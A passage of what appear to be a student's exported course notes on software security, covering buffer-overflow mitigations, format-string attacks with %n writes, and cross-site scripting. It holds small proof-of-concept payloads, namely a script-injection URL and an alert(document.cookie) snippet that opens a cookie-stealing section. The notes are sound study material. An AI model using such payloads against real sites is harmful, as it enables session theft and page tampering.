style="list-style-type:circle">if they are the same then all is good, you are really the root</li></ul><ul id="023a168c-5351-4aba-9724-0ea00588648e" class="bulleted-list"><li style="list-style-type:circle">if not, then it’ll downgrade the EUID to RUID </li></ul></li></ul><figure id="71d18925-7d63-46de-9693-91d455793ffd" class="image"><a href="image%2054.png"><img style="width:567.984375px" src="image%2054.png"/></a></figure><ul id="846e058f-5cc9-4f04-86df-a523d2106540" class="bulleted-list"><li style="list-style-type:disc">this is defeated by just setting the root UID to 0 </li></ul></details></li></ul><ul id="0998c185-ed73-4c37-b3ac-3d5d53a7d333" class="toggle"><li><details><summary>OS Approaches: Non-executable Stack</summary><ul id="5e4f34f3-f219-46d8-bb9e-4233bdfa53cc" class="bulleted-list"><li style="list-style-type:disc">make the stack not executable, make it only store data</li></ul><figure id="9248fe83-b557-4169-bbe7-48f9e1691d59" class="image"><a href="image%2055.png"><img style="width:567.96875px" src="image%2055.png"/></a></figure><ul id="04031475-1ea6-424e-8b1e-a962b3402198" class="bulleted-list"><li style="list-style-type:disc">there s bit called the NX bit, when it is set, then no execution will be done</li></ul><ul id="d1b6c953-fc71-4783-be34-1b754dad5943" class="bulleted-list"><li style="list-style-type:disc">gcc enables this by default, to get around this, just disable it</li></ul><ul id="2e3658ae-c5bc-4028-8fd6-747fffed603b" class="bulleted-list"><li style="list-style-type:disc">return to libc can also defeat the attack</li></ul></details></li></ul><ul id="ce0ab871-64ae-4a46-ae0d-d7e8dbf8c577" class="toggle"><li><details><summary>Compiler Approaches: stack guard </summary><figure id="dac5cca6-21f2-4868-8ec9-13ce961d8f61" class="image"><a href="image%2056.png"><img style="width:568px" src="image%2056.png"/></a></figure><figure id="69901b52-c05f-46a3-b3a4-a62dadc47ee2" class="image"><a href="image%2057.png"><img style="width:568px" src="image%2057.png"/></a></figure><ul id="c080720b-1913-49b0-806b-a2009ea46ca6" class="bulleted-list"><li style="list-style-type:disc">the program has a secrete int (the canery) </li></ul><ul id="a3a62c55-becc-481b-9990-0cc800ee8343" class="bulleted-list"><li style="list-style-type:disc">this value is created by the compiler</li></ul><ul id="b33807a9-59ef-4839-a220-08c4ab5fdceb" class="bulleted-list"><li style="list-style-type:disc">if the canery is deleted or different, the os knows that a buffer overflow has occured and kills the program<figure id="48b33793-83ff-43c3-900c-2b59e15baedd" class="image"><a href="image%2058.png"><img style="width:540px" src="image%2058.png"/></a></figure></li></ul></details></li></ul><ul id="3d76250f-5514-4641-a980-0e2cf9d269ad" class="toggle"><li><details><summary>More and more mitigations</summary><figure id="349ebd9f-eb58-40f6-81e7-a3237384c50b" class="image"><a href="image%2059.png"><img style="width:297px" src="image%2059.png"/></a></figure></details></li></ul></details></li></ul></details></li></ul><ul id="8da7629c-1ff5-48eb-8743-93227f001daf" class="toggle"><li><details><summary>Tutorial 1</summary><ul id="7cc824ad-662b-41a4-a661-096fce79ebf7" class="toggle"><li><details><summary>Binary and Hexadecimal</summary><figure id="8c6de3bb-c012-472d-805f-507a82adfb39" class="image"><a href="image%2060.png"><img style="width:2472px" src="image%2060.png"/></a></figure></details></li></ul><ul id="2ac3b5f4-1ff6-452e-a791-dd4298979616" class="toggle"><li><details><summary>Endianness</summary><figure id="5b7220aa-e4fb-4bb0-8149-1426b0fb5a22" class="image"><a href="image%2061.png"><img style="width:2373px" src="image%2061.png"/></a></figure><h3 id="22374700-0a34-47fb-9c26-ef8cd390e325" class="">Example</h3><figure id="5b850cac-63cd-4937-a062-626f7cc0fce2" class="image"><a href="image%2062.png"><img style="width:2410px" src="image%2062.png"/></a></figure><ul id="0888ca7c-35bb-41fe-8b19-7d9ead3678f9" class="bulleted-list"><li style="list-style-type:disc">in little endian, if an int is stored at address 100, then the least significant byte (at the end) is stored first (at the start of the memory address)</li></ul></details></li></ul><ul id="a91a9226-6a5a-4fa1-acda-dc5048e37912" class="toggle"><li><details><summary>Stack attack example</summary><h3 id="405507d7-bac3-4ac4-a877-9a6f745c0ef6" class="">Environment setup</h3><figure id="897f80b3-74a5-408e-94fe-a8ee090f42cc" class="image"><a href="image%2063.png"><img style="width:701px" src="image%2063.png"/></a></figure><figure id="5a61b457-5890-401d-b287-cede4f2cbd1f" class="image"><a href="image%2064.png"><img style="width:563px" src="image%2064.png"/></a></figure></details></li></ul><p id="32ffb39a-378c-4e98-b457-f7c86e52847b" class=""><div class="indented"><p id="5393c288-7736-4ac8-b41e-3b3880ad5b91" class="">
</p></div></p></details></li></ul></details></li></ul><ul id="1c92ce42-f5ab-4f96-b1c9-fcf4607490e2" class="toggle"><li><details><summary>Format String Attack</summary><ul id="fbffd92f-c7d0-4bce-a950-863999b1d8f8" class="toggle"><li><details><summary>Format Strings and printf() and optional/variadic arguments</summary><h3 id="3223311d-ecf6-4adb-bbb8-e322a3ad43dd" class="">Printf function</h3><ul id="f2dd83fc-38d0-4d21-b7ac-e9f674054418" class="bulleted-list"><li style="list-style-type:disc">printf is a function that can accept arbitrary amount of arguments</li></ul><ul id="64c21ee4-6096-47b5-ab22-9d7e857772f0" class="bulleted-list"><li style="list-style-type:disc">it is an example of a function with “variadic arguments”</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="350a4f7f-0e3a-41f8-9d8f-79b9e22f6c0a" class="code"><code class="language-C">int printf(const char* format, ...);

//eg
printf(&quot;blahblahblah: %Access optional argumentsd, %d, %D&quot;, i, j, k);</code></pre><h3 id="a1b9d710-e71b-4e8c-ac52-a233a9e904fb" class="">Access optional arguments</h3><ul id="28229bf1-6f9d-49ec-8f6a-9967e92b148b" class="bulleted-list"><li style="list-style-type:disc">optional arguments are accepting into a function by using … syntax</li></ul><ul id="dc35da13-498e-40fa-bbc6-58bb4e5774f9" class="bulleted-list"><li style="list-style-type:disc">we need to use <code>va_list</code> macro and <code>va_start, va_args, va_end</code>functions <ul id="0127f53c-f60b-4b0e-a06e-dcbe57f39be0" class="bulleted-list"><li style="list-style-type:circle"><code>va_list </code>is a macro that points to the current argument in the stack</li></ul><ul id="e8be81af-2189-4a71-b956-192df1431501" class="bulleted-list"><li style="list-style-type:circle"><code>va_arg </code>function increments to the next argument</li></ul><figure id="19d9a8ab-1744-4ad8-948f-af85d83d09f2" class="image"><a href="image%2065.png"><img style="width:960px" src="image%2065.png"/></a></figure><figure id="765954ae-adf1-4d4b-b390-f16dcd21b625" class="image"><a href="image%2066.png"><img style="width:1056px" src="image%2066.png"/></a></figure></li></ul><ul id="de590ce1-c5f7-4c96-8941-78d4b65098a6" class="bulleted-list"><li style="list-style-type:disc">printf types the optional arguments with by using format specifiers<figure id="927262ac-1e6b-491d-a0f0-e70138893e88" class="image"><a href="image%2067.png"><img style="width:480px" src="image%2067.png"/></a></figure><figure id="8d7c39d0-a90a-40e9-86ab-f12ee691baa9" class="image"><a href="image%2068.png"><img style="width:480px" src="image%2068.png"/></a></figure><figure id="a7bb3578-5358-4c03-b4f7-6e3a40c935ad" class="image"><a href="image%2069.png"><img style="width:480px" src="image%2069.png"/></a></figure></li></ul><ul id="ef7e1788-9103-428c-b390-65a3ce4de308" class="bulleted-list"><li style="list-style-type:disc">if incorrect number of optional arguments are not given to printf, while still specifiying a format specifier,  <code>va_args </code>will still continue to increment to the next item in the stack<figure id="7189607a-43e5-4880-92a1-453dce76afba" class="image"><a href="image%2070.png"><img style="width:480px" src="image%2070.png"/></a></figure></li></ul><ul id="e62fef46-d9c1-40e3-8ee8-a1970b25f5a4" class="bulleted-list"><li style="list-style-type:disc">the problem above is an issue and can cause vulrablities when untrusted users use the format string<p id="5455b488-a6dc-48b5-aea8-6fe843bc4697" class="">format string is treated as code, a user being able to specifiy a format string is specifying code which is dangerous </p><figure id="c6bfdb06-988c-45bb-864b-7993969b5e1f" class="image"><a href="image%2071.png"><img style="width:480px" src="image%2071.png"/></a></figure></li></ul></details></li></ul><ul id="8e849aa7-e584-4f7f-8c06-a804b5d15d5f" class="toggle"><li><details><summary>Format String Vulnerability</summary><h3 id="8177a757-5bf3-44f1-ab3d-bac6621e1550" class="">Format string vulnerability</h3><p id="315118e8-b79f-4a3d-b6ce-21bc0a4e9a27" class="">the following statements contain <code>user_input </code>in the printf function</p><p id="5025beed-29a9-4da4-90fa-a18ea9418d3a" class="">if the <code>user_input </code>includes a format string, then things can break and the user can inject code</p><figure id="adca4bff-389c-4934-8244-78ada0516f43" class="image"><a href="image%2072.png"><img style="width:432px" src="image%2072.png"/></a></figure><h3 id="ac7d09e0-00bd-4ec3-8cee-9adb4865e1b9" class="">Vulnerable (Set-UID) codes</h3><figure id="17a75d8b-b9e0-4a3d-af03-bb7e4639f75e" class="image"><a href="image%2073.png"><img style="width:2491px" src="image%2073.png"/></a></figure><h3 id="fb7d09f9-8277-4408-84e2-0668bd16eddd" class="">Vulnerable program’s stack layout</h3><figure id="a2b28ed6-435b-4ed7-b8dc-71fb2ea05ac0" class="image"><a href="image%2074.png"><img style="width:624px" src="image%2074.png"/></a></figure><h3 id="45d198bf-bf55-46e3-88b8-a1611b946d2d" class="">What can we achieve?</h3><ul id="fa11e1a9-1464-49d1-90bd-bb84cd83de51" class="bulleted-list"><li style="list-style-type:disc">Attack 1: Crash program</li></ul><ul id="1ec537e9-b4dd-4c8b-ac00-c882a99cd7d1" class="bulleted-list"><li style="list-style-type:disc">Attack 2: Print out data on the stack</li></ul><ul id="daef9dab-d2c3-4f90-8a53-9e0db3624e52" class="bulleted-list"><li style="list-style-type:disc">Attack 3: Change the program’s data in the memory</li></ul><ul id="2cc69a2d-6f50-473a-b42e-40dd37b6583e" class="bulleted-list"><li style="list-style-type:disc">Attack 4: Change the program’s data to a specific value</li></ul><ul id="116a3499-e47c-4583-88cf-ea175e99cd8a" class="bulleted-list"><li style="list-style-type:disc">Attack 5: Inject malicious code</li></ul></details></li></ul><ul id="30b15f97-d035-4463-b1ac-73231059ab33" class="toggle"><li><details><summary>Format String Attacks</summary><ul id="36677bc5-daba-4cf9-9533-e2f8a47b19f5" class="toggle"><li><details><summary>Attack 1 Crash Program</summary><figure id="477fe08b-3974-4835-ae76-f73742e768c5" class="image"><a href="image%2075.png"><img style="width:624px" src="image%2075.png"/></a></figure></details></li></ul><ul id="5d1334e5-ab92-4b72-aed7-8f0067a30e1a" class="toggle"><li><details><summary>Attack 2 print out data from the stack</summary><h3 id="10a4a83c-63a6-4840-ba7a-c032e39a3edd" class="">Print out data on the stack</h3><figure id="e6d0d881-46e8-464a-a5cc-1913e96177a0" class="image"><a href="image%2076.png"><img style="width:624px" src="image%2076.png"/></a></figure><h3 id="bb8f87bf-3a1e-48ea-94a0-638900c67343" class="">Print out secret value on the stack</h3><blockquote id="25cc54ec-9161-4f05-874b-69f339217e26" class="">if the distance between a secret value in the stack and va_list is 20 bytes away, because we know each increment of va_list will be 4, we’ll need 5 %x specifiers to move to the variable and an extra one to print it</blockquote><figure id="7474f638-aa58-4c11-8d70-56e230cbd13d" class="image"><a href="image%2077.png"><img style="width:2527px" src="image%2077.png"/></a></figure><h3 id="4c64861f-f215-461d-9979-51d35d756934" class="">Print out data not in the stack</h3><figure id="34c18097-28c1-413e-9ac8-79e5876b9ffa" class="image"><a href="image%2078.png"><img style="width:624px" src="image%2078.png"/></a></figure><h3 id="c17d4c0d-632e-4190-beff-7a55d6cb0a42" class="">Print out data at a specific address</h3><ul id="4b9cd4c8-d7c4-4d5c-a423-7aa36b9179ba" class="bulleted-list"><li style="list-style-type:disc">set a variable of the specific address</li></ul><figure id="d5e78467-e7c4-458f-ae0f-de09594cca03" class="image"><a href="image%2079.png"><img style="width:2466px" src="image%2079.png"/></a></figure><ul id="c85a0937-6f67-422f-b864-e6fa78e708bb" class="bulleted-list"><li style="list-style-type:disc">we can do this with %n</li></ul><figure id="afbe02ba-a2aa-4e99-88d1-807692278e7b" class="image"><a href="image%2080.png"><img style="width:2468px" src="image%2080.png"/></a></figure></details></li></ul><ul id="cf88ec32-328f-4de5-99ad-86e3904cf826" class="toggle"><li><details><summary>Attack 3 Change program’s data in memory</summary><h3 id="dc1f0987-ff16-4bc5-a3b9-d8268d7c82f3" class="">Change Program’s data in memory</h3><figure id="38a315fa-4430-4d9e-b123-a0b3cb0b15a3" class="image"><a href="image%2081.png"><img style="width:2459px" src="image%2081.png"/></a></figure><figure id="150b845e-1f20-4234-8166-c1ead9ed6b4e" class="image"><a href="image%2082.png"><img style="width:624px" src="image%2082.png"/></a></figure></details></li></ul><ul id="85884dd8-7537-4af4-ab8d-a5c03650b530" class="toggle"><li><details><summary>Attack 4 Change program’s data at a specific value</summary><h3 id="bd4e927c-46ea-4796-8909-13e621ceff58" class="">Attack 4: Change program’s data to a specific value</h3><figure id="e1d48c6d-caea-4a4b-81b3-c412fec06b06" class="image"><a href="image%2083.png"><img style="width:624px" src="image%2083.png"/></a></figure><h3 id="9ba98167-61d7-4165-970a-82ba32555bd6" class="">A faster approach</h3><ul id="64852ed8-69f3-4e1e-9570-de388a0d4636" class="bulleted-list"><li style="list-style-type:disc">split the address we want to insert our data in into 2 parts</li></ul><ul id="2cfaa4e8-9673-4c3d-aa11-3618bc29d411" class="bulleted-list"><li style="list-style-type:disc">write 2 bytes at a time</li></ul><figure id="21b95eff-b350-4b12-a863-facb8d7589f6" class="image"><a href="image%2084.png"><img style="width:2491px" src="image%2084.png"/></a></figure><figure id="f812f931-6d7a-41ac-a6d1-1f113c3af592" class="image"><a href="image%2085.png"><img style="width:2468px" src="image%2085.png"/></a></figure></details></li></ul><ul id="e3feb5e9-22f4-4606-86b2-549610782bc9" class="toggle"><li><details><summary>Attack 5 Inject malicious code</summary><figure id="7adfbb1e-f88e-48c4-9579-ad21b34488c8" class="image"><a href="image%2086.png"><img style="width:596px" src="image%2086.png"/></a></figure><figure id="7637812c-4eab-483d-ad89-f57b79286753" class="image"><a href="image%2087.png"><img style="width:596px" src="image%2087.png"/></a></figure><figure id="d6171154-f629-41ac-9e26-7305f1acc457" class="image"><a href="image%2088.png"><img style="width:596px" src="image%2088.png"/></a></figure></details></li></ul><p id="c9d9224e-0536-49b4-8ef6-bb5a65ddd5e6" class="">
</p></details></li></ul><ul id="471cc96c-bc98-451c-bbf9-cf0c63ea30c2" class="toggle"><li><details><summary>Recap: Format string vulnerability </summary><figure id="4a0d47d5-6207-4810-85db-04d010e5037f" class="image"><a href="image%2089.png"><img style="width:480px" src="image%2089.png"/></a></figure><ul id="b891e856-60d6-4aca-bac1-b6f009b625dd" class="bulleted-list"><li style="list-style-type:disc">format string is the mandatory argument that determines the type of optional arguments</li></ul><ul id="d3ffdaa1-03e9-4dc9-93be-40dca79f96f9" class="bulleted-list"><li style="list-style-type:disc">eg: format string needed in printf</li></ul><ul id="91db0070-5876-4302-8e00-a011c61b3447" class="bulleted-list"><li style="list-style-type:disc">if the user can influence the format string, then the program is vulnerable to format string attacks</li></ul><figure id="a27dfebe-084a-4efc-8fcb-f2ca20d53e08" class="image"><a href="image%2090.png"><img style="width:384px" src="image%2090.png"/></a></figure><ul id="83ed28fb-46eb-4387-a825-80afeb8bfee1" class="bulleted-list"><li style="list-style-type:disc">format strings are vulnerable because they can contain specifiers that act like code</li></ul><ul id="33d081a4-cd60-4360-9027-4b47345f419f" class="bulleted-list"><li style="list-style-type:disc">va_list is a pointer to optional arguments in the attack<ul id="6ada5775-61ba-403c-ad5f-211f49d3d1d5" class="bulleted-list"><li style="list-style-type:circle">va_arg() moves to the pointer to the next argument </li></ul></li></ul><ul id="c752957a-76cb-4e0a-88d1-136b2c9dc141" class="bulleted-list"><li style="list-style-type:disc">format strings can execute and alter these pointers and functions</li></ul><figure id="0f0aa17c-3bcd-4d55-b8fd-f5b32c1a8e34" class="image"><a href="image%2091.png"><img style="width:816px" src="image%2091.png"/></a></figure><figure id="02ab91f4-505c-49b7-81b9-2c0418bc5dc7" class="image"><a href="image%2092.png"><img style="width:2489px" src="image%2092.png"/></a></figure><figure id="7a3754b4-d401-405c-b389-31ca27de652b" class="image"><a href="image%2093.png"><img style="width:2510px" src="image%2093.png"/></a></figure><ul id="6fe05562-91d9-49cd-972c-392dbd6d35e4" class="bulleted-list"><li style="list-style-type:disc">we need to pass an address in hex as an input</li></ul><ul id="50e52942-8ac5-41c6-81d0-f6dab745246c" class="bulleted-list"><li style="list-style-type:disc">we can’t do this, so use echo</li></ul><figure id="e689b55c-1267-4d44-99ea-e87d5cef3ad5" class="image"><a href="image%2094.png"><img style="width:2498px" src="image%2094.png"/></a></figure></details></li></ul><ul id="7a82489f-ed75-4ca4-b9a0-5cf55443fde7" class="toggle"><li><details><summary>The width modifier and the %n format specifier</summary><h3 id="47c3774c-9c1b-4364-91fc-9902d917a2d9" class="">Precision modifier</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e8d05206-47de-46ae-840f-bbd800cce252" class="code"><code class="language-Java">printf(&quot;%.5d\n&quot;,10); //00010</code></pre><h3 id="bfe42d5f-4a1f-4a85-a8c0-c71b3cfc86d5" class="">Width modifier</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="30dbf61f-a8d8-445f-8f0b-7efa4f5aeca9" class="code"><code class="language-Java">printf(&quot;%5d\n&quot;,100); //   10</code></pre><figure id="965bef6a-2dfd-4bf6-9403-b228290c805f" class="image"><a href="image%2095.png"><img style="width:2483px" src="image%2095.png"/></a></figure><h3 id="fa14b4d5-4fb0-4da8-ae8d-9605aa9ba0f8" class="">Length modifier for %n</h3><figure id="b46d9185-4f88-4eb0-a237-87fb71c67e4b" class="image"><a href="image%2096.png"><img style="width:596px" src="image%2096.png"/></a></figure></details></li></ul><ul id="02142c28-3e0f-4729-aaf8-f7de759aa516" class="toggle"><li><details><summary>Countermeasures</summary><ul id="bffec752-36ba-44b4-b2b5-feafa0f6b3e9" class="toggle"><li><details><summary>Developer Approach</summary><ul id="9e053168-4bc9-4044-8ad6-3e9bb951a30b" class="bulleted-list"><li style="list-style-type:disc">as the developer, avoid using untrusted inputs for format strings in functions like printf</li></ul><ul id="5e726cba-cdd4-4acb-ae08-ded4eff5e6e2" class="bulleted-list"><li style="list-style-type:disc">never let the user be able to use format strings</li></ul><figure id="726e2cdd-b937-43b3-99a1-dc7f0262a06d" class="image"><a href="image%2097.png"><img style="width:595.96875px" src="image%2097.png"/></a></figure></details></li></ul><ul id="f95a24a8-01a5-4668-9e79-fbc4993be608" class="toggle"><li><details><summary>Compiler Approach</summary><figure id="4ceee5a0-d392-41a5-a070-f4efe200c2b7" class="image"><a href="image%2098.png"><img style="width:596px" src="image%2098.png"/></a></figure><ul id="7b77bec6-8005-4576-8a4b-ef2dca0bdd27" class="bulleted-list"><li style="list-style-type:disc">clang and gcc will give warnings when a mismatch of format strings are provided</li></ul><ul id="b2095829-c56d-4f48-8225-d346f81b7764" class="bulleted-list"><li style="list-style-type:disc">if we add option -wformat=2, then it’ll give you 2 warnings</li></ul><figure id="b47e4c9d-d088-4c14-8d77-bd2174edd890" class="image"><a href="image%2099.png"><img style="width:596px" src="image%2099.png"/></a></figure><figure id="0c363954-8d2b-44e5-8097-5a692bef4e90" class="image"><a href="image%20100.png"><img style="width:596px" src="image%20100.png"/></a></figure></details></li></ul><ul id="c8580185-9176-4edb-9ae9-2a037a00add2" class="toggle"><li><details><summary>Other Approaches</summary><figure id="dbb719fe-6270-477f-b5af-05ee631c7187" class="image"><a href="image%20101.png"><img style="width:595.984375px" src="image%20101.png"/></a></figure></details></li></ul></details></li></ul><ul id="1001a926-7344-8081-add1-f265d3e45cff" class="toggle"><li><details><summary>Format String tutorial</summary><ul id="1001a926-7344-80f5-9845-d36de625cd89" class="toggle"><li><details><summary>Precision</summary><figure id="2b5fc72b-9f7f-414e-b5aa-86599bd009ef" class="image"><a href="image%20102.png"><img style="width:2513px" src="image%20102.png"/></a></figure><figure id="1001a926-7344-80f1-89c2-fe8bc664b037" class="image"><a href="image%20103.png"><img style="width:2392px" src="image%20103.png"/></a></figure></details></li></ul><ul id="1001a926-7344-8072-828f-eb32e6bd9089" class="toggle"><li><details><summary>attack example</summary><figure id="94b3a9ff-9ddc-4e8c-9e31-0c160e76e48f" class="image"><a href="image%20104.png"><img style="width:624px" src="image%20104.png"/></a></figure><figure id="d896d3e5-5782-4021-b459-42b26d1117bd" class="image"><a href="image%20105.png"><img style="width:596px" src="image%20105.png"/></a></figure><figure id="d4747cfd-3727-4297-a0ae-606052dfe51e" class="image"><a href="image%20106.png"><img style="width:596px" src="image%20106.png"/></a></figure><figure id="1001a926-7344-8013-a1b3-fdac5789c7e2" class="image"><a href="image%20107.png"><img style="width:596px" src="image%20107.png"/></a></figure><figure id="0041647a-752a-43b9-810b-2030df4dd6a3" class="image"><a href="image%20108.png"><img style="width:596px" src="image%20108.png"/></a></figure><ul id="1001a926-7344-80f4-8a3d-d9f14e6dde65" class="bulleted-list"><li style="list-style-type:disc">if the program source code contains null or 0<ul id="38170a19-9483-4c0f-ba94-c2d22bf6cc4a" class="bulleted-list"><li style="list-style-type:circle">because null/0 are invalid memory addresses, you try to advance va_list to that</li></ul><ul id="1001a926-7344-8069-ae8b-dcdb9f624a2e" class="bulleted-list"><li style="list-style-type:circle">this will cause the program to crash</li></ul></li></ul></details></li></ul><p id="1001a926-7344-80fc-ae8a-da61f217e4a6" class="">
</p><p id="1001a926-7344-80ea-a03a-d1d99ea45e97" class="">
</p></details></li></ul></details></li></ul><ul id="1041a926-7344-809c-9f28-f5ecceae402b" class="toggle"><li><details><summary>Cross-Site Scripting Attack</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1041a926-7344-8029-837f-cc126bd32eb0"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="6ff6fc7f-9a3d-44c7-851e-666b9608c2d9" class="">XSS refers to <mark class="highlight-yellow_background">client side code injection</mark></p><ul id="1041a926-7344-8046-b077-d0aed377ec60" class="bulleted-list"><li style="list-style-type:disc">attacker executes malicious code in a user’s browser via the target website</li></ul><ul id="1041a926-7344-8060-9dbd-dd1b24d77a46" class="bulleted-list"><li style="list-style-type:disc">attacker uses a vulnerable website as a delivery mechanism to deliver the script</li></ul><figure id="1041a926-7344-8023-8103-d47afdd035bb" class="image"><a href="image%20109.png"><img style="width:384px" src="image%20109.png"/></a></figure><ul id="1041a926-7344-80ed-8c0b-c256bed21a90" class="bulleted-list"><li style="list-style-type:disc">because the injected code is coming from the website, it is regarded as trusted and can access/change: contents of the page, read cookies, send out requests on behalf of the user, code can do whatever the user can do inside the session</li></ul></div></figure><ul id="1041a926-7344-8099-aefd-d4b8f5ab8049" class="toggle"><li><details><summary>Types of XSS attacks</summary><h3 id="ca3d5000-0e72-40c8-b7cb-cda01bdb8181" class="">Non-persistent Reflected XSS Attack</h3><p id="1041a926-7344-80b2-ae65-f09daadd9b04" class="">if a website with reflective behavior takes user inputs:</p><ul id="1041a926-7344-80e2-b355-c9c3478064fa" class="bulleted-list"><li style="list-style-type:disc">attacker can put javascript in the input</li></ul><ul id="1041a926-7344-80f3-a3be-d8cf4dcd3ef6" class="bulleted-list"><li style="list-style-type:disc">when the input is reflected back: javascript will be injected into the webpage</li></ul><ul id="1041a926-7344-8047-a321-d0978f1aac68" class="bulleted-list"><li style="list-style-type:disc">eg: <code>http://www.example.com/search?input=word</code>, where word is provided by the users<ul id="a75fed22-211a-4919-81fb-7326a99ed81f" class="bulleted-list"><li style="list-style-type:circle">attacker sends the following URL to the victim and tricks them to click the link: <code>http://www.example.com/search?input=&lt;script&gt;alert(“attack”);&lt;/script&gt; </code></li></ul><ul id="1041a926-7344-8022-aa4e-f9139267c080" class="bulleted-list"><li style="list-style-type:circle">when the victim clicks the link: HTTPS request is sent to the server, user gets back the search result with the input in the page and it is ran on the user’s browser </li></ul></li></ul><h3 id="1041a926-7344-80d8-8311-dfe5770e785c" class="">Persistent/Stored XSS Attack</h3><p id="f0fb3b61-1d7a-4bd9-8b91-b07214a0af4a" class="">attacker directly send data to a target website/server which stores the data</p><ul id="1041a926-7344-801e-8fe1-c8ace5bc04e3" class="bulleted-list"><li style="list-style-type:disc">if the website later sends the stored data to other users” creates a channel between user and the attacker</li></ul><ul id="fa237a3b-cc79-4ac2-a12c-b964cfff4406" class="bulleted-list"><li style="list-style-type:disc">eg: user profile in a social network is a channel, as it is set by one user and viewed by another.</li></ul><ul id="5c914af5-78e2-4d20-82d4-5277d1aef6b3" class="bulleted-list"><li style="list-style-type:disc">profile/comment chancels are supposed to be data channcels<ul id="853c03ad-158a-4cf2-a13f-93df6120cfef" class="bulleted-list"><li style="list-style-type:circle">but data provided contain HTML and JS code</li></ul><ul id="1041a926-7344-80b5-8b5e-eafc5fc61c4d" class="bulleted-list"><li style="list-style-type:circle">if the input is not sanitized properly, JS code is executed by the user’s browser who’s through the channel</li></ul></li></ul><p id="832b3276-5347-43fd-836c-a95701f5b1fa" class="">
</p></details></li></ul><ul id="1041a926-7344-80c9-967d-d912e8c0be5c" class="toggle"><li><details><summary>Possible Damages</summary><h3 id="1041a926-7344-806e-ab14-e77f7eb9f246" class="">Web defacing</h3><ul id="1041a926-7344-8097-8178-fd15facfcb23" class="bulleted-list"><li style="list-style-type:disc">JS can use  Document Object Model (DOM) APIs to access DOM nodes inside the hosting page</li></ul><ul id="1041a926-7344-8020-8550-fa0aeef30559" class="bulleted-list"><li style="list-style-type:disc">injected JS code can make arbitrary changes to the page</li></ul><ul id="ea09928b-c3d6-4797-998c-423f52657ec3" class="bulleted-list"><li style="list-style-type:disc">eg: JS code changes news article site to something fake or change some pictures on the page</li></ul><h3 id="1041a926-7344-80d1-a5ea-e4b7f7c679bf" class="">Spoofing requests</h3><ul id="1041a926-7344-8024-8772-ed57ee695972" class="bulleted-list"><li style="list-style-type:disc">injected JS code can send HTTP requests to the server on behalf of the user</li></ul><h3 id="1041a926-7344-8089-b1d4-cc8e0ad3716f" class="">Stealing Information</h3><ul id="1041a926-7344-80d2-bc45-d59f4c1fae27" class="bulleted-list"><li style="list-style-type:disc">injected JS code can steal victim’s private data:<ul id="1041a926-7344-80a8-9466-d46efd0cd803" class="bulleted-list"><li style="list-style-type:circle">session cookies</li></ul><ul id="1041a926-7344-8076-ba95-eeed3092d5e3" class="bulleted-list"><li style="list-style-type:circle">personal data displayed on the page</li></ul><ul id="1041a926-7344-807e-9322-d4e7978cd1f7" class="bulleted-list"><li style="list-style-type:circle">data stored locally by the web app</li></ul></li></ul></details></li></ul><ul id="1041a926-7344-80a0-8f81-df0e292df22c" class="toggle"><li><details><summary>Befriend with others attack</summary><ul id="1041a926-7344-80d2-b897-c953db100635" class="toggle"><li><details><summary>Stealing cookies</summary><h3 id="1041a926-7344-80ee-b0f0-de90f4f3d574" class="">Print cookies</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1041a926-7344-801c-9832-e45827581304" class="code"><code class="language-HTML">&lt;script&gt;
		alert(document.cookie);
